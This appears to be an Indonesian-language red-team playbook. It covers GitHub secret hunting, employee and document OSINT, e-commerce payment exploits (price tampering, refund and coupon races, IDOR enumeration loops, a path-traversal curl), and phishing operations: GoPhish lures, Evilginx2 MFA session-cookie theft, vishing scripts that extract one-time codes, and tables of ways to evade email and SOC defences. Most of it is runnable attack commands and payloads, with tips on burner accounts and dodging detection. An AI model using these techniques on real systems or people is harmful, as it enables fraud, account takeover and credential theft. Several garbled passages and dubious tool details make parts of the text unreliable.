## 4. GitHub Secret Hunting (TruffleHog & Gitleaks)

### TruffleHog
**Versi:** v8.19+ (Go rewrite).

```bash
trufflehog github --repo=https://github.com/target/app \
  --issue-comments --pull-requests \
  --token=$GITHUB_TOKEN \
  --only-verified                              # deteksi via commit history & live check

# scan seluruh org
trufflehog github --org=target \
  --only-verified --token=$GITHUB_TOKEN

# file sistem & postman
trufflehog filesystem --directory=.           # repo lokal full .git history
trufflehog filesystem --directory=/path --exclude-paths=.git,node_modules
trufflehog docker --image=target/app:latest
trufflehog git file:///path/to/local/repo
trufflehog postman --workspace=xyz
```

**Apa yang muncul:**

```
Verification: verified true
Detector: AWS
Raw secret: AKIA...
File: config/production.yml
Commit: f00c...bac
```

**Kenapa berhasil (v8+):** scanning via `git log -p` (melintasi commit objects termasuk yang sudah diberi force push alias history "terhapus"), regex terstruktur (JSON, arbitrary companions, base64 decode), verifikasi live API key via endpoint resmi (mis. `sts:GetCallerIdentity` untuk AWS key) → FP rendet.

**Kenapa gagal:** key sudah di-rotate (verification false → tool tetap log tapi marked inactive), key tersebut pernah di-commit ulang di file besar skip (v8 default max depth), **harus pakai GitHub token atau rate limit 429**.

### Gitleaks
**Versi:** v8.18.x (single Go binary).

```bash
# scan repo lokal / full git history (jika .git ada)
gitleaks detect --source /path/to/repo --no-banner -v

# scan remote
gitleaks git --log-opts="--full-history" https://github.com/target/app -v

# scan directory non-git (file current)
gitleaks dir /path -v

# custom rules (gitleaks.toml)
gitleaks detect --config gitleaks.toml .
```

**gitleaks.toml pattern perusahaan-internal:**

```toml
[[rules]]
id = "corp-internal-token"
description = "Internal API token Target"
regex = '''TARGET_[A-Z0-9]{32}'''

[[rules]]
id = "corp-db-conn"
description = "DB conn string internal"
regex = '''(mysql|postgres)://[a-zA-Z0-9_]+:[^@]{4,}@.'''

[[rules]]
id = "corp-private-key"
description = "Private key"
keywords = ["BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY", "BEGIN PRIVATE KEY"]
regex = '''(?s)-----BEGIN [A-Z]*PRIVATE KEY----[\s\S]*?-----END [A-Z]*PRIVATE KEY-----'''

[allowlist]
paths = ['''gitleaks.toml''']
```

**Kenapa berhasil:** scan list file + `git log --all -p` vs regex; entropic filter untuk filter string pancaindera (FP reduction).

**Kenapa gagal:** secret obfuscated/b64/native Vault (cloak), repository sudah dihapus dari GitHub (fork masih hidup — scan fork), secret **bukan di repo melainkan di GitHub Issues/PR comment** (pakai `trufflehog github --issue-comments`), atau enterprise self-hosted GHE (endpoint beda — set `--endpoint=https://ghe.target.co.id`).

**Perintah GitHub search manual (tambahan OPSEC sensitif):**

```bash
curl -s "https://api.github.com/search/code?q=%22TARGET_API_KEY%22+in:file+language:python" \
  -H "Authorization: token $GITHUB_TOKEN" | jq '.items[].repository.full_name'
```

**Hati-hati:** searching signal secret di corporate repo tanpa auth = segera muncul di activity feed pemilik repo — gunakan akun burner, operator jangan pakai akun GitHub pribadi.

## 5. Metadata Dokumen

**Apa yang dikirim:** — pasif total, file dianalisis lokal.

**Toolchain (kali/exiftool 12.76+, metagoofil, FOCA fork):**

```bash
# ambil semua PDF/XLS perusahaan via Google filetype dork
# lalu dump metadata
exiftool -a -u -g1 *.pdf > metadata_dump.txt

# pattern berharga
exiftool *.docx | grep -E "Author|Company|Last Modified By|Template"
exiftool *.pdf | grep -E "Creator|Producer|Title|Subject"
```

**Contoh temuan kritis:**

| Field | Nilai contoh | Intel |
|---|---|---|
| `Author` | `budi.santoso` | konfirmasi pola username `nama.depan` |
| `Last Modified By` | `Sari Dewi \(QA\) (W10-PC04)` | hostname PC internal + nama + divisi |
| `Software` | `Microsoft Word for Office 365 (Windows 10)` | build Windows 10 usang, kandidat CVE lateral |
| `Template` | `\\fileshare\templates\resmi.dotx` | UNC path internal — indikasi SMB share |
| PDF `Producer` | `Chrome 131.0.6460.0` | versi browser pegawai |

**Extraction massal:**

```bash
pip install metagoofil   # atau gunakan spiderfoot
metagoofil -d perusahaan.co.id -t pdf,docx,xlsx -l 100 -n 20 -o outdir -f results.html
```

**Kenapa gagal/berhasil:** berhasil karena pegawai Windows 11 24H2 masih upload file tanpa sanitize metadata (kebijakan anti-leak belum ada); gagal jika target sudah proses via DLP sanitization, atau seluruh dokumen hanya SaaS mirrors (SharePoint UATH) tanpa file asli publishable.

**Dork pintu masuk:**

```text
site:perusahaan.co.id filetype:pdf | filetype:docx
site:perusahaan.co.id ext:pdf inurl:profil
"confidential" filetype:xlsx site:perusahaan.co.id
(/pptx) site:perusahaan.co.id
```

## 6. Footprint Karyawan

**Pivot nama → struktur org:** LinkedIn + `theHarvester 7.x`:

```bash
theHarvester -d perusahaan.co.id -b linkedin,bing,google -l 200 -f hasil.xml
# output: emails, hosts, names → generate kandidat email:
python3 -c "from requests import get; ..."   # gunakan prowl untuk pola corp
```

Perintah cepat pra-kickoff nama → kandidat awal:

```bash
pip install name-that-hash && \
printf "budi santoso\nsari dewi\n" | while read -r name; do \
  genemails -d perusahaan.co.id -i "$name" -f "first.last,f.last,flast" ; done
```

**Nama → bukti kartu / tanda pengenal →** validasi NIK format Indonesia (16 digit, prefix kode kemendagri, satu digit gender) **hanya untuk verifikasi struktur data, bukan untuk memanfaatkan penggunaan identitas nyata.**

**Nomor HP pivot:** phoneinfoga 2.x + truecaller web + leakcheck:

```bash
phoneinfoga scan -n +62812xxxxxxx
phoneinfoga serve  # web UI: operator, karrier, possible fingerprint leaks
```

**Apa yang muncul:** nama (via leak DB), ko-dompeat akun marketplace, vacuum apel date `exodus privacy reports`, platform email apa dipakai (imeiSys).

**Kenapa berhasil:** data footprint lama belum pernah dihapus; pegawai pakai nomor pribadi untuk registrasi applicatif publik (e-commerce, gelar SIP) yang kemudian jadi databroker.

**Kenapa gagal:** banyak entri datang dari *rekontamination database broker* — sebelum kamu ambil data dari source "menjijikkan", pertama verifikasi apel name/collect the chain: highlight jika value the data subject.

---

## 7. Jebakan Operasional (Kenapa Ini Gagal di Lapangan)

1.  **`trufflehog`/`gitleaks` scan history panjang** → sesi timeout/`429 rate limit`. Split: `--since-commit` per milestone, atau `git log -G` prefilter file name pattern (`.env`, `config`, `credential`).
2.  **GitHub scraping tanpa token** → fingerprint IP cepat kena secondary rate limiting. Selalu pakai token burner — dan jangan org-crawl via API search code (`api.github.com/search/code` butuh endpoint org auth).
3.  **Shodan API key free-tier** → hanya 1 result page; `shodan search` tanpa `--facets` tiba-tiba return exception; gunakan `monitor` + alert untuk perubahan aset, bukan ad-hoc scan besar dari web.
4.  **holehe/maigret dari kantor client** → semua request ke 120 situs dari satu IP; kena fingerprint webmail target, atau internal blue team melihat probe DNS/HTTP dari outside ke endpoint `accounts.corp` → jangan scan dari IP aset engagement. Jalankan dari VPS burner/SOCKS rotator.
5.  **CT log data lama sudah kadaluarsa** → subdomain dari Censys certs index bisa sudah decommission; selalu resolve ulang dengan `dig` sebelum menandai live; else test report kamu penuh host mati.
6.  **exiftool di file besar batch** → beberapa PDF (ratusan MB, brochure print) hang atau crash (stderr pipe penuh). Gunakan `-q -q`, dan `-fileOrder` limit; skip PDF versi >2.0 (parser warning).
7.  **Target pakai email alias/plus addressing** → pivot holehe gagal; coba iterasi `nama+n`, `nama@p171gmail.com`, `nama@icloud.com`, dan cek apakah format berbeda via `.har` capture dari endpoint yang tampilkan email mask ("masukkan kata sandi untuk p****a@***").
8.  **Wildcard DNS** → semua subdomain DNS enum return "Ada", mencemari report. Validasi: `dig @8.8.8.8 randomstring.target.co.id` – kalau resolve, tandai wildcard.
9.  **Papercut legal/substansi:** berbagi hasil (nomor NIK, nomor HP pribadi, kartu keluarga) dalam report ke klien bermasalah tanpa redline privacy review — banyak engagement batal gara-gara attach file PII mentah bukan bukti vuln. Redact kecuali yang esensial sebagai proof.
10. **Klaim "verified" dari trufflehog melulu status API** — key mungkin expired menit berikutnya; jangan laporkan "akses aktif" hanya berdasar verification oracle; sebutkan timestamp verifikasi, jangan scan ulang berkali (beberapa verifikasi AWS sendiri menulis CloudTrail; begitupun Slack 2FA admin alert bisa trigger terhadap pemilik token).


## payment-logic

# payment-logic — misc

# Payment & Commerce Logic — Referensi Teknik

## 1. Price Manipulation (Client-Side Price Tampering)

### 1.1 Hidden Field Manipulation
 сценарio: Checkout form mengirim total harga sebagai bagian dari request.

**Yang dikirim:**
```http
POST /checkout HTTP/1.1
Host: shop.target.internal
Content-Type: application/x-www-form-urlencoded

product_id=SKU-8891&quantity=1&unit_price=15&total_price=15&currency=IDR
```

**Dimodifikasi:**
```
product_id=SKU-8891&quantity=1&unit_price=15&total_price=1&currency=IDR
```

**Apa yang muncul:** Invoice terbit dengan total Rp 1. Berhasil karena backend trusted `total_price` dari client tanpa recompute dari DB.

**Payload Burp (Intruder positions):**
```
total_price=§1§
total_price=§0§
total_price=§-5§
total_price=§0.01§
```
Total negatif kadang lolos validasi `<` comparison yang salah arah.

### 1.2 Integer Underflow / Negative Quantity
```
quantity=-1&unit_price=100000&total_price=-100000
```
- Beberapa cart engine memvalidasi `quantity > 0` tapi voucher/discount dihitung `total = price * quantity` → negative offset memotong item lain di cart.
- Quantity `0.001` jika regex hanya cek integer string.

### 1.3 Floating Point Rounding
```
unit_price=0.045&quantity=1000  → backend round-half-even (banker's rounding)
```
| Value | Java BigDecimal HALF_EVEN | PHP round() | Go math.Round |
|---|---|---|---|
| 0.005 | 0.00 | 0.01 | 0.01 |
| 44.5 | 44 | 45 | 45 |

Bedakan: sistem yang hitung subtotal di JS (Chrome 131 devtools `a.toFixed()` → string) vs backend integer-cents. Cents-only system kebal_ta rounded attack.

### 1.4 Decimal Separator Confusion
```
total_price=1,500      → locale id parsed sebagai 1,5 atau string "1500"?
total_price=1.500.000  → reject? atau strip → 1.500?
```
Uji di layer: parse di Node 22.x vs PostgreSQL numeric vs MySQL DECIMAL.

---

## 2. Currency Confusion

### 2.1 Base/Display Currency Mismatch
**Skenario:** Rate konversi diambil dari API pihak ketiga (mis. Binance ticker) yang sering punya pair `IDRUSDT` dan `IDR_USDT` dengan skala berbeda (perse 1 vs per-1000).

```http
POST /api/payment/create HTTP/1.1
Content-Type: application/json

{"product":"SKU-8891","amount":9,"currency":"IRR","display_currency":"IDR"}
```
- IRR nominal besar → jika backend pakai `display_currency` untuk charge tapi `currency` untuk konversi Stripe, invoice bisa terbit Rp 9 untuk barang Rp 9.000.000.

### 2.2 Payment Provider Currency Swap
**Yang dikirim:**
```json
{"amount": 100, "currency": "JPY", "intent_request": {"currency": "JPY"}}
```
Stripe amount dalam sen (cents) **kecuali zero-decimal currency** (JPY, KRW, IDR di masa lalu, dsb). Aplikasi belajar satu provider lalu migrasi → helper `amountToMinor()` diterapkan ke JPY → dobel/nol-kali pengali.

Cek daftar zero-decimal di Stripe API version:
```bash
curl -s https://api.stripe.com/v1/balance \
  -u sk_test_xxx | jq '.available[].currency'
```

### 2.3 Rate Manipulation via Parameter Injection
```http
POST /api/checkout/convert
{"from":"USD","to":"IDR","rate_source":"client","rate":0.0001,"amount":100}
```
Field `rate` ikut terkirim. Gunakan grep cepat di Burp Logger untuk pola `"rate":` dan `"fx":`.

### 2.4 Trailing/Leading Zero & Case Tricks
```
currency=idr  vs IDR  vs "IDR " (trailing space) → different lookup key → fallback rate 1
```

| Input | PHP lookup array | Go map | Python dict |
|---|---|---|---|
| "idr" | miss (case-sens) | miss | miss |
| "IDR " | rtrim diperlukan | miss | miss |
| "IDR\x00" | XSS-able di log | match di beberapa parser | error |

Gunakan fallback yang aman (raise, bukan `rate = 1`) untuk deteksi kode yang salah.

---

## 3. Coupon & Discount Stacking

### 3.1 Reusable Coupon Code (Single-Use Bypass)
**Request:**
```http
POST /api/coupon/apply
{"cart_id":"c-1","code":"WELCOME10"}
```
Diulang 50x via Intruder, thread 10, no rate limit → all 50 result `"discount": 10}`.

**Kenapa berhasil:** tabel relasi `code_usage(code_id, user_id)` dengan UNIQUE constraint yang VARCHAR beda case (`WELCOME10` vs `welcome10` vs `WELCOME10\x20`) menembus constraint di MySQL 8.0 default collation `utf8mb4_0900_ai_ci`... UNIQUE akan match. Gunakan `utf8mb4_0900_as_cs` (case-sensitive) postgres default case-sensitive → different behavior.

### 3.2 Chain Discount via Split Cart (Sequence Exploit)
Skenario: diskon menghitung ulang item order di request kedua, terpisah dari commit pertama.

```
1. POST /cart/coupon  {"code":"BUNDLE50"}   → cart total 500
2. POST /cart/coupon  {"code":"BUNDLE50"}   → cart total 250 (stacked)
3. POST /cart/coupon  {"code":"BUNDLE50"}   ...
```
Race via HTTP/2 50 parallel stream di nginx 1.25 reverse proxy:
```bash
h2load -n 50 -c 5 -m 10 -d coupon.json -H "Content-Type: application/json" \
  -T "Authorization: Bearer ..." https://shop.target.internal/api/cart/coupon
```
Jika backend single-thread check-then-act per request → race window di DB timestamp.

Check-then-act di Redis cluster:
```
GET coupon:used → no
SETEX coupon:used 3600 1
```
Bukan atomic → gunakan payload paralel untuk tembus. Yg aman: `SET NX`.

### 3.3 Cross-User Coupon / Enumeration
```bash
for code in $(seq 100000 100200); do
  curl -s -X POST https://shop.target.internal/api/coupon/apply \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"code":"PROMO-'$code'"}' -o /dev/null -w "$code %{http_code}\n"
done
```
HTTP 200 vs 400 vs 403 → atomic enumeration → dump hasil 403 (exists, not eligible) untuk reuse di session lain.

---

## 4. Refund Abuse

### 4.1 Double Refund (Idempotency Missing)
**Request:**
```json
{"order_id":"ORD-123456","amount":50000,"reason":"damaged"}
```
Diulang via Burp `Repeater` dengan **JRepeater/repeat continuously 50x/s** → response 200 beberapa kali → refund ganda ke rekening. Bandingkan:
- Stripe: `/v1/refunds` butuh idempotency key header `Idempotency-Key` → jika aplikasi tidak forward header ini → refund engine internal yang tidak punya konsep idempotency.

### 4.2 Partial Refund > Total Price | Refund Amount Manipulation
```json
{"order_id":"ORD-123456","refund_amount":99999,"original_amount":50000}
```
Backend pakai `refund_amount` dari client. Atau:
```json
{"order_id":"ORD-123456","line_items":[{"sku":"SKU-1","qty":5,"price":50000}]}
```
Item sudah direfund → refund lagi dengan qty sama, sistem tidak decrement `refund_remaining`.

### 4.3 Currency Swap di Refund Flow
Beli IDR Rp 5.000.000 → refund via API dengan `"currency":"IDR"` tapi provider pakai `"currency":"USD"` internal mapping (Rp 5.000.000 → $5.000.000 dalam salah scaling minor units).

### 4.4 Refund Produk Setelah Resell / Digital Item
```bash
# Refund lalu claim license tetap aktif
curl -X POST https://shop.target.internal/api/refund \
  -d '{"order_id":"ORD-123456"}'
# license key masih valid
curl https://shop.target.internal/api/license/AB12-CD34-EF56
```

---

## 5. Race Condition di Checkout

### 5.1 Single Stock Multi-Buy
**Skenario:** Stok 1, voucher 1x pakai, saldo gift card terbatas.

**Tool:**
```bash
# Turbo Intruder (Burp)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           engine=Engine.BURP2)
    for i in range(30):
        engine.queue(target.req, target.baseInput)
```

Atau `ffuf`:
```bash
ffuf -u https://shop.target.internal/api/checkout \
  -X POST -H "Content-Type: application/json" \
  -d '{"cart_id":"cart-777","voucher":"ONE-TIME-50"}' \
  -t 50 -mc all -o race_result.json
```

**Apa yang muncul di response:**
- 30x response 200 dan `voucher_balance` masing-masing `-50000` → **berhasil eksploit**, saldo negative.
- Atau beberapa 200 dan beberapa 409 → lock ada tapi leaky (jendela 50-200ms).

### 5.2 Balance Deduction Race (TOCTOU)
```python
# Pseudocode vulnerable
user = db.get_user(uid)
if user.balance >= price:        # check
    db.charge(uid, price)         # act — tidak atomic
```

Test payload paralel dengan balance yang dibuat exact-harga (e.g. balance 50000, price 50000) → jika charge 2x sukses → race. Perhatikan DB engine:
| DB | Default isolation | Race-prone? |
|---|---|---|
| MySQL 8.0 InnoDB | REPEATABLE READ | Ya (tanpa SELECT FOR UPDATE) |
| PostgreSQL 16 | READ COMMITTED | Ya tanpa row lock |
| SQLite (WAL) | Serialized | Sulit race |
| Redis WATCH/MULTI | Optimistic | Aman jika dipakai |

### 5.3 Gift Card / Voucher Redeem Race
```http
POST /api/giftcard/redeem
{"code":"GIFT-XXXX-XXXX","cart_id":"cart-12"}
```
Pattern yang sering lolos: kode voucher `UNIQUE` di tabel `user_voucher`, tapi unique constraint di DB tidak di-tap saat 50 request paralel Python/uvicorn ASGI worker tunggal lock relaks → jika backend pakai Celery worker single-listener, race window kecil tapi ada saat worker scale-out.

---

## 6. IDOR di Invoice/Order Object

### 6.1 Order Enumeration
```http
GET /api/order/ORD-0000123 HTTP/1.1
Authorization: Bearer <token_user_A>
```
Response order milik user B → IDOR. Variasi identitas object:
- Sequential integer: `/order/12345`
- UUID: `/order/8b7c...` → butuh leak source (confirmation email ref, JS bundle, CDN config)
- Hash key short: `hashid(12345)` → decode jika salt default (Hashids library default salt "this is my salt" v2.x)

### 6.2 Download Invoice as PDF — IDOR via path traversal + identifier
```http
GET /invoice/download?file=INV-2024-88772
GET /invoice/download?path=/static/invoices/INV-2024-88772.pdf
GET /invoice/2024/11/INV-88772.pdf     # static file served nginx
```
nginx 1.25 punya `alias` misconfig klasik:
```nginx
location /invoicepdf {
    alias /var/www/invoices/;   # request /invoicepdf../otheruser/INV-8872.pdf
}
```
**Payload:**
```bash
curl --path-as-is https://shop.target.internal/invoicepdf../admin/INV-0001.pdf -o leaked.pdf
```

### 6.3 Change Order Status / Ship Address (IDOR write)
```http
PUT /api/order/ORD-0000123 HTTP/1.1
{"shipping_address":{"addr":"attacker address"},"status":null}
```
Beberapa API memfilter field tapi lupa whitelist → user berhasil mengubah alamat order orang lain (intercept shipping) atau trigger `"resend"` untuk retake.

### 6.4 Refund via IDOR
```http
POST /api/refund
{"order_id":"ORD-0000999"}     # order milik user lain
```
Response 200 → refund dana diteruskan ke payment method TERATEGISTRASI user lain tapi dikirim ke rekening attacker apabila juga IDOR di `refund_to_user_wallet` field.

### 6.5 Fingerprinting Response
Deteksi cepat dengan jq:
```bash
for id in $(seq 1000 1100); do
  resp=$(curl -s https://shop.target.internal/api/order/$id \
    -H "Authorization: Bearer $USER_A")
  uid=$(echo "$resp" | jq -r '.user_id')
  [[ "$uid" != "$USER_A_ID" ]] && echo "IDOR: /order/$id -> $uid"
done
```

### 6.6 Enumeration via Embed ID / Receipt Link
Email receipt: `https://shop.target.internal/r/AbCdEf1234` — struktur hash pendek (mis. base36 8-char) → 36^8 terlalu besar, tapi generation predictable (`md5(order_id + static)` → raw order ID di MD5 → trivially predictable:
```python
import hashlib
[print(hashlib.md5(str(i).encode()).hexdigest()[:8]) for i in range(1000,1100)]
```

---

\newpage
## Jebakan Operasional yang Bikin Teknik Ini Gagal di Lapangan

1. **IP throttling sebelum race selesai.** nginx 1.25 `limit_req_zone` 5 r/s memutus paralel upload — proto race yang ideal butuh bypass (IP rotasi via proxy pool, atau HTTP/2 multiplexing yang dianggap satu koneksi oleh rate limiter per-conn).
2. **Database lock granular tapi ada** — vulnerable hanya pada window 20–100ms, tapi kalau target pakai Galera Cluster + `SELECT FOR UPDATE`, banyak attempt masuk deadlock mysqli error → false negative "aman" padahal sebenarnya bisa di-groom timing ke arah tepat.
3. **JWT session stale** — race yang menyentuh cart lama (cart ID sudah check-out) return 400 `cart is completed` untuk 29/30 request → butuh waktu-friendly to-cart yang manual, sulit dalam scenario race sejam/1 hari interval.
4. **Refund tidak instan** — sistem queued refund (batch hourly) membuat double-refund terlihat gagal padahal masuk queue 2x → perlu tunggu log `refund_status = queued` untuk verifikasi, bukan pengecekan instant.
5. **Price recomputed setelah submit** — payment provider (Stripe/Midtrans) callback `charge.succeeded` memicu recompute di webhook → app tampak vulnerable di UI tapi payable amount sudah saner → negative test harus sampai proses webhook, bukan stop di response checkout.
6. **Idempotency key di-generate client-side per session** — header `Idempotency-Key: uuid` fresh di setiap attempt membuat "keamanan komponen itu tidak berarti" → jangan asumsikan reflection `200 OK` berarti sukses ganda, perlu trace ke total saldo final.
7. **Coupon code sudah expired by datetime** — staging coupon `DEMO50` expired 3 minggu lalu, tested → 404, dikira tidak bisa dipakai → bypass single-use disguise sebagai failure aman.
8. **Load balancer sticky session** — race yang mencapai 2/20 node berbeda membuat cache distribusi tampak konsisten, race hanya tembus saat antre request secara coincidental mendapat 2 node di jeda yang tepat.
9. **Tabel order SQL berlapis view** — beberapa "vendor" admin panel menambal IDOR di API endpoint tapi other interface direct query ke raw table masih exposing → ditemukan lewat endpoint legacy (`/api/v1_old/order/...`) yang sering tidak masuk scope awareness engineer → grep endpoint JS bundle di dashboard internal.
10. **Negative balance tidak dikirim sebagai refund / credit latched** — refund sukses nominal sebesar Rp 50.000.000 ke wallet walletless user (belum verifikasi KYC) → belum ada sukses eksfiltrasi dana, hanya stuck saldo internal → laporan tidak impactful kecuali ditemukan konversi (mis. Point System → another user ID via IDOR shard).

Pendek paling sering membuat aplikasi payment vulnerable **bukan di** satu endpoint, melainkan pada **asumsi kepercayaan lintas-layer** (checkout → payment provider callback → fulfillment → refund). Pastikan scope testing merentang sampai proses async (webhook, queue, email receipt) sebelum menyimpulkan keberhasilan eksploit.


## social-engineering

# social-engineering — misc

# Referensi: Social Engineering & Phishing Infrastructure

## 1. Pretexting Matrix

| Pretext | Payload yang dikirim | Yang muncul di target | Vektor | Tingkat keberhasilan |
|---|---|---|---|---|
| IT Support / Helpdesk | "Ticket #48213: Kredensial AD kamu expired, reset via link" | Urgensi + familiaritas (SDM benar-benar pakai ticketing) | Email + link | Tinggi awal Senin pagi / setelah long weekend |
| Vendor / Supplier | "Invoice Q4 attachment, verifikasi perubahan rekening" | Novelty threat response — invoice = prioritas bisnis | Email + lampiran/link | Sedang, butuh OSINT invoice asli |
| HR / People Ops | "Perubahan kebijakan cuti, acknowledge via portal" | Authority + FOMO kebijakan baru | Email + landing page | Tinggi akhir bulan/awal tahun |
| Internal IT (spoofed domain) | "Storage quota penuh (99%), validasi ulang via SSO" | Scarcity + teknis cukup masuk akal | Email spoof/dedupe domain | Tinggi bila domain mirip |

**Anatomi pretext yang jalan:**
- Authority (HR/IT punya hak untuk bertanya kredensial — normalisasi permintaan)
- Urgency (deadline 1×24 jam)
- Familiaritas (prosedur yang terdengar mirip alur internal asli — cek intranet via OSINT LinkedIn/job posting untuk bahasa & template)
- Channel switch (email → phone meningkatkan kepercayaan karena "ada manusia di baliknya")

## 2. Phishing Infrastructure

### 2.1 GoPhish (v0.12.1)

**Deploy:**
```bash
# VPS hardening dulu: rDNS/PTR ke domain, SPF, DKIM, DMARC p=none untuk domain sendingkita
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
./gophish
# Admin: https://127.0.0.1:3333 — bind ke 127.0.0.1, akses via SSH tunnel
ssh -L 3333:127.0.0.1:3333 user@vps
```

**Konfigurasi sending profile (SMTP):**
- Opsi A: SMTP relay custom (Mailgun/SendGrid — cepat masuk, tapi sender domain terkait)
- Opsi B: self-hosted Postfix 3.8 + domain baru, warm-up 2 minggu
- Kirim test: gunakan `mail-tester.com`, target skor ≥9/10

**Template — yang dikirim (contoh primer SSO):**
```html
From: IT Helpdesk <helpdesk@corp-infra.com>
Subject: [Action Required] Alert: Your password will expire in 24 hours

Hi {{.FirstName}},

Password Anda untuk Windows/SSO akan expire dalam 24 jam.
Reset sekarang: <a href="{{.URL}}">portal renew</a>

Jika tidak dilakukan, akses VPN dan email akan terkunci.

IT Service Desk — ticket {{.RId}}
```

**Yang muncul di target:** email normal-looking; `{{.RId}}` = tracking ID unik per-recipient → kita tahu siapa yang klik & submit (laporan kredensial di GoPhish dashboard "Results").

**Kenapa berhasil/fail:** berhasil bila domain sender lolos SPF/DKIM/DMARC alignment dan URL tidak ter-blacklist (check diagecko/URLScan sebelum kirim). Gagal bila EOP/Defender for Office 365 dengan Safe Links menulis ulang URL → terlihat jelas `*.safelinks.protection.outlook.com`.

### 2.2 Evilginx2 (v2.4.0) + Phishlet — MFA Capture

Attacker-in-the-middle (AiTM): proxy halaman login **asli**, jadi kredensial **dan session cookie** yang di-capture — MFA bisa dilewati karena kita pegang cookie pasca-MFA.

**Deploy (VPS terpisah dari GoPhish):**
```bash
apt install nginx -y   # nginx 1.25 sebagai front terminator TLS (opsional, evilginx bisa native TLS)
wget https://github.com/kgretz/evilginx2/releases/download/2.4.0/evilginx-linux-amd64.zip
./evilginx -p ./phishlets
```

**Konfigurasi phishlet (contoh generic O365 — nama obfuscators via built-in):**
```
(phishlet) domain mimicking:
  phish_sub: 'login'
  orig_sub: 'login'
  domain: 'microsoftonline-target.com'   # domain attacker
  session: true

auth_paths:
  - '/auth/login'

creds:
  - username field selector
  - password field selector
  - login post URL

force_http: false
```
Set lures:
```
phishlets hostname microsoftonline-target.com
lures create microsoftonline
lures edit 0 redirect_url https://portal.office.com
lures edit 0 phishing_domain login.microsoftonline-target.com
```

**Auto-SSL:** Evilginx2 minta cert via ACME untuk domain attacker (butuh A record → VPS IP, port 80/443 open). `phishlets enable <name>` trigger issuance.

**Alur end-to-end:**
1. GoPhish kirim email berisi lure URL `https://login.microsoftonline-target.com/...`
2. Target klik → Evilginx2 reverse-proxy halaman login **asli** Microsoft (Chrome 131 melihat sertifikat valid untuk domain kita — gembok hijau ✓, karena cert asli untuk domain kita, bukan domain Microsoft)
3. Target submit username+password → Evilginx2 forward ke Microsoft asli, capture kredensial di log
4. Okta/Entra push MFA → target approve (halaman **asli** bilang "verifying" normal) → Evilginx2 capture **session cookie** dari response
5. Impor cookie ke browser operator: ekstensi Cookie-Editor, inject `ESTSAUTH`/session tokens → akses tenant **tanpa trigger perangkat baru MFA**

**Kenapa berhasil:** MFA memvalidasi *session*, bukan *user* — kita membajak objek yang divalidasi. **Kenapa gagal:** Entra ID Conditional Access dengan device compliance (Intune) menandai cookie tercuri device tidak-taati; token binding / continuous access evaluation (CAE) memotong session saat anomali IP; halaman dengan JavaScript framedetection/same-site hardening.

### 2.3 Variasi proven
| Tool | Use case |
|---|---|
| Modlishka | Alternatif AiTM, plugin routing fleksibel |
| Evilginx3 (fork) | Phishlet updates utk layout IdP baru; maphishlet format beda |
| MFAthias |
| Cactus/Phishious | Simulasi infra phishing utk benchmark gateway email |

## 3. Credential Harvesting & Data Collection (di GoPhish landing)

- GoPhish built-in credentials harvester: `{{$`/ teknik placeholder `{{.Email}}` prefill username; set "Capture Submitted Data" di campaign → password muncul di dashboard.
- Custom landing page toggle via `login.landing.openqa.net` harvesting bin opsional `phishlets → creds only` bila CSP IdP memblokir proxy penuh.

## 4. Vishing Script

**Infra:** VoIP SIP trunk / provider dengan ANI spoofing legal-per-region (atau legitimate company-number), softphone (Zoiper/Linemax), call recording bila scope. Simulasi pakai SIPML5 testing server.

**Script Helpdesk Reset (yang dibacakan operator):**
```
"Good afternoon — this is [Name/Hector] from [Company Redacted] Internal IT,
ticket number [XXXXX81]. We're seeing your account flagged for a
compromised sign-in event from an unrecognized IP. We need to verify
your identity immediately and apply a protective access restoration.
I'll send you a one-time passcode via SMS — can you read the
six-digit code back to me once you receive it?"
```

**MFA-pivot vishing standard (tanpa phishlet)** — operator trigger push MFA:
1. Cred stuffing dilakukan → push/prompt dikirim via perangkat
2. Operator call target: "We're testing a new process — please tap
   'Approve' to decline" (atau push fatigue via 3-5 rapid-notification, bila
   scope-untested)

**Yang dikirim:** voice call + (opsional) SMS berisi link singkat ke halaman phishing mobile-optimized. **Yang muncul:** target menyerahkan kode OATH/duo-relay. **Kenapa berhasil:** context of urgency middleware + phone-number spoof bila helpdesk-number masuk allowlist. **Kenapa gagal:** target callback ke nomor helpdesk **resmi** dari intranet → pretext collapse; kadang organisasi pasang "callback policy" — hampir selalu bagi helpdesk staff butuh training bypass, jangan asumsikan.

## 5. Deteksi & Anti-Mitigasi (read-team: apa yang di-hindari)

| Kontrol | Deteksi menyebabkan | Countermeasure |
|---|---|---|
| Microsoft Defender for Office MFA relax | Tag spoof domain / campaign-abrupt `Exchange transport rule` + geser domain-age | Kirim slow-drip (GoPhish `Batch/track` delay), domain >2 minggu |
| Egress/ C2 assoc | AiTM lure URL terkena `SmartScreen`/VT | URLScan takedown-avoid content `\.well-known known-blocklist-scrub`, pre-test diagecko |
| FIDO2 / phishing-resistant | hardware-key prompt blocks capture | abort — pilih cohort dengan password-only MFA (sumber: check MFA-registered-based CA failures) |
| Conditional Access (named locations) | Login-attempt from attacker IP flagged | IP-in-a-box via corp network shift / guest-wifi network access first |
| User report button | 3+ laporan → SOC takedown abuse report registrar | Use commonly known `<brand>`-domain(SOC familiarity) infra takedown-layer: domain-privacy enabled but nameserver protected against simple whois-flag |
| SMS relay 2FA | OATH codes captured need real-time sex-user affordances | GoPhish Direct Reports graphic `OTP-form` auto-submit worked previously |
| Detection ML (Abnormal/Proofpoint TAP) | Landing page classified | time-of-day-known-internal page template pixel-match decoy header credential-based brand page |

## 6. Jebakan Operasional (Kenapa Ini Gagal di Lapangan)

1. **Domain baru = spam tombstone.** Mendaftar domain hari sebelum kirim hampir pasti landing di junk. Domain butuh age ≥2 minggu + proper DMARC, warm-up, dan reputasi. Rencanakan sewaktu-buat domain infra minggu-2 sebelum engagement.
2. **TLS/redirect bug Evilginx2.** Subphishlets yang tidak menyertakan original-subdomain JS asset caching akan nyangkut saat submit form. Selalu jalankan `tests/phishlet handler` di Chrome 131 headless sebelum mulai campaign.
3. **CAE/CBAT (continuous access evaluation).** Entra ID B2B cross-tenant smartlockout memotong session cookie AiTM ~15 menit setelah sign-in risk-change. Segera harvest → gunakan cookie atau gunakan neko-blackbox — simpan cookie sub-5-menit, jangan tunggu campaign selesai.
